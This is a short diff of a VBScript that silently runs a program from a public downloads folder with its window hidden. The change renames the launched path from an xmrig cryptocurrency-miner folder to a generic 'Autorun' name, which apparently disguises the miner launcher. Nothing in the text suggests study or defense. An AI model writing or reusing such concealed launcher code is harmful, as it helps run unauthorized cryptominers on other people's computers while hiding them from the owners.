@@ -1,2 +1,2 @@
-sComm = "C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN"
+sComm = "C:\Users\Public\Downloads\Autorun"
 CreateObject("Wscript.Shell").Run "cmd /c " & sComm, 0, True
